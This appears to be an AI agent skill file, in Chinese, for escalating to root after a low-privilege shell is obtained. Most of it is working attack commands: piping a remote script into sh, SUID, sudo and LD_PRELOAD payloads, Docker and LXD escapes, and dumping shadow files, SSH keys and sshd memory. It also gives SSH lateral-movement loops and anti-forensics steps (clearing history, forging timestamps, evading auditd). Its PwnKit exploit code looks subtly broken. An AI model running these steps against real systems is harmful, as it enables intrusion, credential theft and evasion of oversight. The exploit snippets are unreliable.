---
name: linux-privesc
description: Linux 提权全链路：枚举（SUID/capabilities/cron/systemd/sudo）、内核漏洞（PwnKit/DirtyPipe/Baron Samedit）、sudo 滥用、服务与容器逃逸、凭据抓取、提权后处置与 OPSEC
whenToUse: 已拿到低权 shell（webshell/RCE/SSH），需要拿 root 或跳到更高权限身份
role: internal
enabled: true
---

# Linux 提权

## 一、枚举先行（不枚举就提权 = 碰运气）

一条命令拿走 90% 信息：

```bash
# 一键枚举（先传 linpeas 或本地跑）
curl -sL http://ATTACKER/linpeas.sh | sh 2>/dev/null | tee /tmp/lp.txt
# 无外网时用自带包
uname -a; id; sudo -n -l 2>&1; cat /etc/os-release
```

手工核心项，逐条看：

```bash
# 1. 内核与发行版（决定打哪个 CVE）
uname -r; cat /etc/os-release | head -3

# 2. SUID / SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# 3. capabilities（比 SUID 更隐蔽的后门面）
getcap -r / 2>/dev/null
# 高危：cap_setuid / cap_setgid / cap_dac_read_search / cap_sys_admin / cap_sys_ptrace

# 4. sudo 权限（最常见突破口）
sudo -n -l 2>&1

# 5. 计划任务
ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null
cat /etc/crontab; systemctl list-timers --all 2>/dev/null

# 6. 可写目录与服务文件
find /etc/systemd/system /lib/systemd/system -writable -type f 2>/dev/null
find / -writable -type d -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -40

# 7. 凭证残留
cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE "pass|token|ssh|mysql -u"
ls -la ~/.ssh/ 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null | head -2
grep -rIl "password\|passwd\|secret" /var/www /opt /home 2>/dev/null | head -20

# 8. 网络与挂载
ip a; ss -tlnp 2>/dev/null; mount | grep -vE "proc|sys|cgroup"
```

## 二、内核漏洞（先比对版本，再动手）

| CVE | 影响版本 | 一句话 | 可用 exp |
|---|---|---|---|
| CVE-2021-4034 PwnKit | polkit 全版本（2009-2022） | pkexec 越界写，任何本地用户直接 root | `pkexec` 一行 exp，最稳 |
| CVE-2022-0847 DirtyPipe | 5.8 – 5.16.11 | 覆写只读文件页缓存 | 改 `/etc/passwd` 或 SUID 二进制 |
| CVE-2021-3156 Baron Samedit | sudo 1.8.2 – 1.9.5p1 | sudoedit 堆溢出 | 需要触发参数组合 |
| CVE-2023-0386 OverlayFS | 5.11 – 6.2 | 用户命名空间 + overlay 提权 | 需 unprivileged userns 开启 |
| CVE-2022-2588 cls_route | < 5.19 | netfilter UAF | 不稳定，慎用 |

判定 userns 是否可用（决定 OverlayFS 类能不能打）：

```bash
cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null
unshare -Ur id 2>&1 | head -1     # 成功即可用
```

PwnKit 最省事：

```bash
# 编译（本地交叉编译或目标机 gcc）
cat > /tmp/p.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(){ char *a[]={"pkexec",NULL}; char *e[]={"PATH=.:/bin:/usr/bin",NULL};
  execve("/usr/bin/pkexec", a, e); return 0; }
EOF
gcc /tmp/p.c -o /tmp/p && cd /tmp && mkdir -p GCONV_PATH=. && echo 'root::0:0:root:/root:/bin/bash' > GCONV_PATH/pwn && chmod +x GCONV_PATH/pwn && ./p
```

## 三、SUID / capabilities 滥用

先查 GTFOBins 对应条目，不要凭记忆敲：

```bash
# 高危 SUID 速判
for b in nmap vim find awk perl python3 bash sh less more cp mv tar rsync env tee; do
  [ -u "$(command -v $b 2>/dev/null)" ] && echo "SUID: $b -> $(command -v $b)"
done
```

典型利用：

```bash
# find
find . -exec /bin/sh -p \; -quit
# vim（保留 euid）
vim -c ':!/bin/sh'
# python3（保留 euid，需 -p 由解释器决定；用 os.setuid）
python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
# cp 覆盖 /etc/passwd
cp /tmp/newpasswd /etc/passwd
# tar 打包提权
tar cf /tmp/x.tar --checkpoint=1 --checkpoint-action=exec=/bin/sh /dev/null
```

capabilities 利用：

```bash
# cap_setuid+ep 的任意二进制
$(which python3) -c 'import os;os.setuid(0);os.system("/bin/sh")'
# cap_dac_read_search：直接读 /etc/shadow
# cap_sys_admin：可 mount，配合 overlay 提权
```

## 四、sudo 滥用

```bash
sudo -n -l          # 关键看 NOPASSWD 与通配符
```

高频可打点：

```bash
# NOPASSWD: ALL
sudo /bin/sh
# sudo vim / less / more / find / awk
sudo vim -c ':!/bin/sh'
# LD_PRELOAD（需 env_keep+=LD_PRELOAD）
sudo LD_PRELOAD=/tmp/x.so someapp
# sudoedit（CVE-2021-3156 面）
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# 通配符注入：sudo /usr/bin/rsync * 之类
```

`LD_PRELOAD` 载荷模板：

```c
// gcc -fPIC -shared -o /tmp/x.so x.c
#include <stdio.h>
#include <unistd.h>
__attribute__((constructor)) void p(){ setuid(0); setgid(0);
  system("cp /bin/bash /tmp/rb && chmod 4755 /tmp/rb"); }
```

## 五、服务、定时任务与容器

```bash
# 可写的 systemd unit
ls -l /etc/systemd/system/*.service 2>/dev/null
# 可写的 cron 脚本（root 跑的）
grep -r "" /etc/cron.d/ 2>/dev/null
# 通配符注入（tar/rsync/chown 带 *）
ls -la /opt/backup* 2>/dev/null

# Docker socket 逃逸（最高性价比）
ls -l /var/run/docker.sock 2>/dev/null
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh

# LXD/LXC 组
id | grep -oE "lxd|lxc"
lxc image import ./alpine.tar.gz --alias a && lxc init a c -c security.privileged=true \
  && lxc config device add c h disk source=/ path=/mnt/root recursive=true && lxc start c \
  && lxc exec c -- /bin/sh

# 容器内判定
cat /proc/1/cgroup | head -3; ls -la /.dockerenv 2>/dev/null
capsh --print 2>/dev/null | grep -i "cap_sys_admin"
```

## 六、提权后处置（拿 root 只是开始）

```bash
# 1. 稳定 shell
python3 -c 'import pty;pty.spawn("/bin/bash")'    # 然后 Ctrl-Z, stty raw -echo; fg

# 2. 抓本机所有凭证
cat /etc/shadow
find / -name "*.kdbx" -o -name "id_rsa" -o -name "*.pem" 2>/dev/null
grep -rIl "BEGIN OPENSSH PRIVATE KEY" / 2>/dev/null | head
# 内存抓密码（需 root）
gcore -o /tmp/ssh $(pgrep -f "sshd: .*@pts") 2>/dev/null

# 3. 横向：复用本机 key 与 known_hosts
cat /root/.ssh/known_hosts | awk '{print $1}'
for h in $(cat /root/.ssh/known_hosts | awk '{print $1}' | cut -d, -f1 | sort -u); do
  timeout 3 ssh -o BatchMode=yes -o StrictHostKeyChecking=no root@$h id 2>/dev/null && echo "REACH $h"
done
```

## 七、OPSEC（做完别留下指纹）

- 不在 `/tmp` 留 exp 源码；用完 `shred -u`
- 不新建 root 账户（用已有服务账户或 SSH key）
- 提权后 `history -c`、清 `~/.bash_history`、注意 auditd `ausearch -m execve`
- 时间戳对齐：`touch -r /etc/passwd <改过的文件>`
- 优先「改配置」而非「装工具」——装包会触发 package manager 日志

## 八、判定纪律

| 现象 | 判定 |
|---|---|
| `sudo -l` 有 NOPASSWD | 提权已成立，直接验证 `sudo id` |
| SUID 命中 GTFOBins 条目 | 需实测能否保 euid（部分发行版已修） |
| 内核版本命中 CVE 表 | 只是「可能」，必须实跑 exp 才算确认 |
| Docker socket 可读写 | 已成立，实质等同 root |
| `cap_sys_admin` 存在 | 需 userns 或已有 mount 权限才可利用 |

**只写实测成功的路径**，`uname -r` 撞上 CVE 不等于能打。
